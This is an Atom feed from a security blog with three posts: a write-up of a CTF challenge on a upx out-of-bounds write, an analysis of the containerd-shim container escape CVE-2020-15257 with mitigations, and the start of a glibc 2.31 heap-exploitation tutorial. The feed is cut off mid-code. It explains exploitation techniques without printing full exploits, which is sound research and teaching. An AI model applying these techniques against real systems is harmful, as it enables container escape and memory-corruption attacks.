<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Swing&#39;Blog 浮生若梦</title>
  
  <subtitle>努力是为了 站在万人中央 成为别人的光</subtitle>
  <link href="https://bestwing.me/atom.xml" rel="self"/>
  
  <link href="https://bestwing.me/"/>
  <updated>2021-01-11T09:21:41.543Z</updated>
  <id>https://bestwing.me/</id>
  
  <author>
    <name>Swing</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>RWCTF-3rd JunkAV writeup</title>
    <link href="https://bestwing.me/RWCTF-3rd-writeup.html"/>
    <id>https://bestwing.me/RWCTF-3rd-writeup.html</id>
    <published>2021-01-10T16:00:00.000Z</published>
    <updated>2021-01-11T09:21:41.543Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>I made a challenge name <a href="https://github.com/chaitin/Real-World-CTF-3rd-Challenge-Attachments/tree/main/JunkAV">JunkAV</a> for RWCTF 3rd .  This is an oob write vulnerability caused by a upx processing PE program.  Congratulations to CodeR00t and 217 who solved it during the game.</p><blockquote><p>Thank <a href="https://twitter.com/leommxj">@leommxj</a> for contributing to this challenge</p></blockquote><h3 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h3><p>Vulnerability is in the PeFile::rebuildRelocs function of pefile.cpp in upx 3.96 .</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111152651.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111152651.png"></a></p><p>When calling the unoptimizeReloc function</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111152714.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111152714.png"></a></p><ol><li>The size of the relocn can be controlled by the user, so the allocation size can be controlled.</li><li>The 1024-1033 guild will flip the data.</li><li>When the data is flipped later, the <code>jc</code> variable on line 1021 becomes controllable, and finally the oob write is completed on line 1023</li></ol><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><ul><li><p>generated upx compressed program :</p><p>​        <a href="http://bestwing.me/attachments/rwctf-3rd/JunkAV/gen_exploit_bin.py">http://bestwing.me/attachments/rwctf-3rd/JunkAV/gen_exploit_bin.py</a></p></li><li><p>ibuf_mod :</p><p>​        <a href="http://bestwing.me/attachments/rwctf-3rd/JunkAV/ibuf_mod">http://bestwing.me/attachments/rwctf-3rd/JunkAV/ibuf_mod</a></p></li><li><p>IO script:</p><p>​        <a href="http://bestwing.me/attachments/rwctf-3rd/JunkAV/exploit.py">http://bestwing.me/attachments/rwctf-3rd/JunkAV/exploit.py</a></p></li></ul><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111155913.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111155913.png"></a></p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://landave.io/2020/11/bitdefender-upx-unpacking-featuring-ten-memory-corruptions/">https://landave.io/2020/11/bitdefender-upx-unpacking-featuring-ten-memory-corruptions/</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="Writeup" scheme="https://bestwing.me/categories/Writeup/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-15257 Docker (容器逃逸）分析</title>
    <link href="https://bestwing.me/CVE-2020-15257-anaylysis.html"/>
    <id>https://bestwing.me/CVE-2020-15257-anaylysis.html</id>
    <published>2020-12-04T16:00:00.000Z</published>
    <updated>2020-12-05T17:53:52.889Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="CVE-2020-15257（Docker-容器逃逸）"><a href="#CVE-2020-15257（Docker-容器逃逸）" class="headerlink" title="CVE-2020-15257（Docker 容器逃逸）"></a>CVE-2020-15257（Docker 容器逃逸）</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>2020/11/30，公开了 <a href="https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4"><strong>CVE-2020-15257</strong></a> 的细节。该漏洞影响 containerd 1.3.x, 1.2.x, 1.4.x 版本</p><p>由于在 host 模式下，容器与 <strong>host</strong> 共享一套 <strong>Network namespaces</strong> ，此时 <strong>containerd-shim API</strong> 暴露给了用户，而且访问控制仅仅验证了连接进程的有效UID为0，但没有限制对抽象Unix域套接字的访问。所以当一个容器为 root 权限，且容器的网络模式为 <code>--net=host</code> 的时候，通过 <strong>ontainerd-shim API</strong>  可以达成容器逃逸的目的</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/IwGn4bPEFWTY15f.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/IwGn4bPEFWTY15f.png"></a></p><h3 id="ontainerd-shim"><a href="#ontainerd-shim" class="headerlink" title="ontainerd-shim"></a>ontainerd-shim</h3><p>在进一步了解漏洞原理之前， 我们需要了解一下啊 <strong>ontainerd-shim</strong> 是什么？</p><p>在 1.11 版本中，Docker 进行了重大的重构，由单一的 Docker Daemon，拆分成了 4 个独立的模块：Docker Daemon、containerd、containerd-shim、runC</p><p>其中，containerd 是由 Docker Daemon 中的容器运行时及其管理功能剥离了出来。docker 对容器的管理和操作基本都是通过 containerd 完成的。</p><p>它向上为 Docker Daemon 提供了 gRPC 接口，向下通过 containerd-shim 结合 runC，实现对容器的管理控制。containerd 还提供了可用于与其交互的 API 和客户端应用程序 ctr。所以实际上，即使不运行 Docker Daemon，也能够直接通过 containerd 来运行、管理容器。</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/q1ecxzGh9r72yM8.png" title="image-20201206002348825" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/q1ecxzGh9r72yM8.png" alt="image-20201206002348825" style="zoom:50%;" /></a><p>​    </p><p>而中间的 <strong>containerd-shim</strong> 夹杂在 containerd 和 runc 之间，每次启动一个容器，都会创建一个新的 containerd-shim 进程，它通过指定的三个参数：容器 id、bundle 目录、运行时二进制文件路径，来调用运行时的 API 创建、运行容器，持续存在到容器实例进程退出为止，将容器的退出状态反馈给 containerd</p><p>关于 <strong>containerd-shim</strong> 的作用细节可以参考作者的 <a href="https://github.com/crosbymichael/dockercon-2016/blob/master/Creating%20Containerd.pdf">slide</a></p><p>最终 ** containerd-shim ** 创建的容器的操作其实还是落实到了 <strong>runc</strong> 上， 而众所周知<strong>runC</strong> 是一个根据 OCI （Open Container Initiative）标准创建并运行容器的 CLI tool。</p><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>漏洞原因在前言部分已经写得很清楚了，说白了就说 暴露了不该有的 API 接口，而   <strong>containerd-shim</strong>  的 API 接口由 Unix 域套接字 实现。代码实现位于</p><p><a href="https://github.com/containerd/containerd/blob/b321d358e6eef9c82fa3f3bb8826dca3724c58c6/runtime/v1/linux/bundle.go#L136">https://github.com/containerd/containerd/blob/b321d358e6eef9c82fa3f3bb8826dca3724c58c6/runtime/v1/linux/bundle.go#L136</a></p><p>实际上在， docker 容器中（以 –net=host 运行),   <strong>containerd-shim</strong>   API 大概长这样</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20201206003829351.png" title="image-20201206003829351" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20201206003829351.png" alt="image-20201206003829351"></a></p><blockquote><p><strong>1)/var/run/docker.sock</strong>：Docker Daemon 监听的 Unix 域套接字，用于 Docker client 之间通信；</p><p><strong>2)/run/containerd/containerd.sock</strong>：containerd 监听的 Unix 域套接字，Docker Daemon、ctr 可以通过它和 containerd 通信；</p><p><strong>3)@/containerd-shim/3d6a9ed878c586fd715d9b83158ce32b6109af11991bfad4cf55fcbdaf6fee76.sock</strong>：</p><p>这个就是上文所述的，containerd-shim 监听的 Unix 域套接字，containerd 通过它和 containerd-shim 通信，控制管理容器。</p><p>/var/run/docker.sock、/run/containerd/containerd.sock 这两者是普通的文件路径，虽然容器共享了主机的网络命名空间，但没有共享 mnt 命名空间，容器和主机之间的磁盘挂载点和文件系统仍然存在隔离，所以在容器内部之间仍然不能通过 /var/run/docker.sock、/run/containerd/containerd.sock 这样的路径连接对应的 Unix 域套接字。</p><p>但是 @/containerd-shim/{sha256}.sock 这一类的抽象 Unix 域套接字不一样，它没有依靠 mnt 命名空间做隔离，而是依靠网络命名空间做隔离。</p></blockquote><p>containerd 传递 Unix 域套接字文件描述符给 <strong>containerd-shim</strong>。<strong>containerd-shim</strong> 在正式启动之后，会基于父进程（也就是 containerd）传递的 Unix 域套接字文件描述符，建立 gRPC 服务，对外暴露一些 API 用于 container、task 的控制：</p><p>通过查阅代码，我们大概知道我们如果能正常访问 <strong>containerd-shim</strong> 接口，我们大概能有这些操作</p><p><a href="https://github.com/containerd/containerd/blob/v1.4.2/runtime/v1/shim/v1/shim.proto">https://github.com/containerd/containerd/blob/v1.4.2/runtime/v1/shim/v1/shim.proto</a></p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">service</span> <span class="title">Shim</span> </span>&#123;</span><br><span class="line"><span class="comment">// State returns shim and task state information.</span></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> State(StateRequest) <span class="keyword">returns</span> (StateResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Create(CreateTaskRequest) <span class="keyword">returns</span> (CreateTaskResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Start(StartRequest) <span class="keyword">returns</span> (StartResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Delete(google.protobuf.Empty) <span class="keyword">returns</span> (DeleteResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> DeleteProcess(DeleteProcessRequest) <span class="keyword">returns</span> (DeleteResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> ListPids(ListPidsRequest) <span class="keyword">returns</span> (ListPidsResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Pause(google.protobuf.Empty) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Resume(google.protobuf.Empty) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Checkpoint(CheckpointTaskRequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Kill(KillRequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Exec(ExecProcessRequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> ResizePty(ResizePtyRequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> CloseIO(CloseIORequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ShimInfo returns information about the shim.</span></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> ShimInfo(google.protobuf.Empty) <span class="keyword">returns</span> (ShimInfoResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Update(UpdateTaskRequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Wait(WaitRequest) <span class="keyword">returns</span> (WaitResponse)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这些接口，从名字基本可以猜测与容器管理说有关系的， 比如     <code>Create</code> 、<code>Start</code> 、<code>Delete</code></p><p>通过查看代码    </p><p><a href="https://github.com/containerd/containerd/blob/v1.4.2/vendor/github.com/containerd/ttrpc/unixcreds_linux.go#L80">https://github.com/containerd/containerd/blob/v1.4.2/vendor/github.com/containerd/ttrpc/unixcreds_linux.go#L80</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UnixSocketRequireSameUser resolves the current effective unix user and returns aStephen J Day, 3 years ago: • vendor: update ttrpc to pull in euid change</span></span><br><span class="line"><span class="comment">// UnixCredentialsFunc that will validate incoming unix connections against the</span></span><br><span class="line"><span class="comment">// current credentials.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This is useful when using abstract sockets that are accessible by all users.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UnixSocketRequireSameUser</span><span class="params">()</span> <span class="title">UnixCredentialsFunc</span></span> &#123;</span><br><span class="line">euid, egid := os.Geteuid(), os.Getegid()</span><br><span class="line"><span class="keyword">return</span> UnixSocketRequireUidGid(euid, egid)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">requireRoot</span><span class="params">(ucred *unix.Ucred)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> requireUidGid(ucred, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">requireUidGid</span><span class="params">(ucred *unix.Ucred, uid, gid <span class="keyword">int</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> (uid != <span class="number">-1</span> &amp;&amp; <span class="keyword">uint32</span>(uid) != ucred.Uid) || (gid != <span class="number">-1</span> &amp;&amp; <span class="keyword">uint32</span>(gid) != ucred.Gid) &#123;</span><br><span class="line"><span class="keyword">return</span> errors.Wrap(syscall.EPERM, <span class="string">&quot;ttrpc: invalid credentials&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">requireUnixSocket</span><span class="params">(conn net.Conn)</span> <span class="params">(*net.UnixConn, error)</span></span> &#123;</span><br><span class="line">uc, ok := conn.(*net.UnixConn)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;a unix socket connection is required&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> uc, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>UnixSocketRequireSameUser </code> 仅仅检查了访问进程的 euid 和 egid ，而在默认情况下容器内部的进程都是以 root 用户启动，所以这个限制可以忽略不计。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>漏洞利用需要构建 <strong>gRPC</strong> ，我们可以通过查阅代码， 查看 <strong>ontainerd</strong> 项目呢关于 <strong>shim-client</strong> 是如何编写的</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// WithConnect connects to an existing shim</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithConnect</span><span class="params">(address <span class="keyword">string</span>, onClose <span class="keyword">func</span>()</span>) <span class="title">Opt</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(ctx context.Context, config shim.Config)</span> <span class="params">(shimapi.ShimService, io.Closer, error)</span></span> &#123;</span><br><span class="line">conn, err := connect(address, anonDialer)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">client := ttrpc.NewClient(conn, ttrpc.WithOnClose(onClose))</span><br><span class="line"><span class="keyword">return</span> shimapi.NewShimClient(client), conn, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过 ttrpc 构建 client，此时 conn 为 unix 套字节</p><p>然后返回 client</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">... ...</span><br><span class="line">c, clo, err :&#x3D; WithConnect(address, func() &#123;&#125;)(ctx, config)</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">return nil, nil, errors.Wrap(err, &quot;failed to connect&quot;)</span><br><span class="line">&#125;</span><br><span class="line">return c, clo, nil</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; ShimRemote is a ShimOpt for connecting and starting a remote shim</span><br><span class="line">func ShimRemote(c *Config, daemonAddress, cgroup string, exitHandler func()) ShimOpt &#123;</span><br><span class="line">return func(b *bundle, ns string, ropts *runctypes.RuncOptions) (shim.Config, client.Opt) &#123;</span><br><span class="line">config :&#x3D; b.shimConfig(ns, c, ropts)</span><br><span class="line">return config,</span><br><span class="line">client.WithStart(c.Shim, b.shimAddress(ns, daemonAddress), daemonAddress, cgroup, c.ShimDebug, exitHandler)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *Runtime)</span> <span class="title">Create</span><span class="params">(ctx context.Context, id <span class="keyword">string</span>, opts runtime.CreateOpts)</span> <span class="params">(_ runtime.Task, err error)</span></span> &#123;</span><br><span class="line">namespace, err := namespaces.NamespaceRequired(ctx)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := identifiers.Validate(id); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, errors.Wrapf(err, <span class="string">&quot;invalid task id&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ropts, err := r.getRuncOptions(ctx, id)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bundle, err := newBundle(id,</span><br><span class="line">filepath.Join(r.state, namespace),</span><br><span class="line">filepath.Join(r.root, namespace),</span><br><span class="line">opts.Spec.Value)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">bundle.Delete()</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">shimopt := ShimLocal(r.config, r.events)</span><br><span class="line"><span class="keyword">if</span> !r.config.NoShim &#123;</span><br><span class="line"><span class="keyword">var</span> cgroup <span class="keyword">string</span></span><br><span class="line"><span class="keyword">if</span> opts.TaskOptions != <span class="literal">nil</span> &#123;</span><br><span class="line">v, err := typeurl.UnmarshalAny(opts.TaskOptions)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">cgroup = v.(*runctypes.CreateOptions).ShimCgroup</span><br><span class="line">&#125;</span><br><span class="line">exitHandler := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">log.G(ctx).WithField(<span class="string">&quot;id&quot;</span>, id).Info(<span class="string">&quot;shim reaped&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> _, err := r.tasks.Get(ctx, id); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// Task was never started or was already successfully deleted</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err = r.cleanupAfterDeadShim(context.Background(), bundle, namespace, id); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.G(ctx).WithError(err).WithFields(logrus.Fields&#123;</span><br><span class="line"><span class="string">&quot;id&quot;</span>:        id,</span><br><span class="line"><span class="string">&quot;namespace&quot;</span>: namespace,</span><br><span class="line">&#125;).Warn(<span class="string">&quot;failed to clean up after killed shim&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">shimopt = ShimRemote(r.config, r.address, cgroup, exitHandler)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例如这样的操作</p><p>更多的交互操作可以参考 张一白的 <a href="https://github.com/summershrimp/exploits-open/blob/9f2e0a28ffcf04ac81ce9113b2f8c451c36fe129/CVE-2020-15257/main.go">PoC</a></p><p>至于具体的利用，在这里就不进行细节探讨了，可以由读者自行完成。最后放一个我的利用视频</p><iframe src="//player.bilibili.com/player.html?aid=800507748&bvid=BV1my4y1q7oe&cid=262892226&page=1&high_quality=1&danmaku=0"allowfullscreen="allowfullscreen" width="100%" height="500" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"></iframe<p>另外欢迎大家关注我的推特： <a href="https://twitter.com/bestswngs/status/1334867563914915840">https://twitter.com/bestswngs/status/1334867563914915840</a></p><h3 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h3><ol><li><p>升级 containerd 至最新版本。</p></li><li><p>通过添加如 deny unix addr=@**的AppArmor策略禁止访问抽象套接字。</p></li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.chainnews.com/articles/937146786717.htm">https://www.chainnews.com/articles/937146786717.htm</a><br><a href="https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4">https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2020-15257" scheme="https://bestwing.me/tags/CVE-2020-15257/"/>
    
  </entry>
  
  <entry>
    <title>Educational Heap Exploitation 2.0 (how2heap glibc 2.31)</title>
    <link href="https://bestwing.me/Education_Heap_Exploit_glibc_2.31.html"/>
    <id>https://bestwing.me/Education_Heap_Exploit_glibc_2.31.html</id>
    <published>2020-11-09T16:00:00.000Z</published>
    <updated>2020-11-12T09:07:12.686Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="how2heap-glibc-2-31"><a href="#how2heap-glibc-2-31" class="headerlink" title="how2heap glibc 2.31"></a>how2heap glibc 2.31</h2><p>前几天 how2heap 更新了，将主仓库划分成了 2.23 、2.27 以及 2.31 三个分类，这里我们来复习（学习） 一下 glibc 2.31 下的一些 heap exploit</p><h3 id="1-fastbin-dup"><a href="#1-fastbin-dup" class="headerlink" title="1. fastbin_dup"></a>1. fastbin_dup</h3><p>关于 fastbin attack 在glibc 2.31 上没有什么变化, 这里给的样例是通过 double-attack 漏洞修改 构造两个指针指向同一个 chunk 的情景。</p><p>程序首先 malloc 了 8 次, 然后 free 了7次（用来填充 tcache bins）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">        ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时 tcachebins 已经填满</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 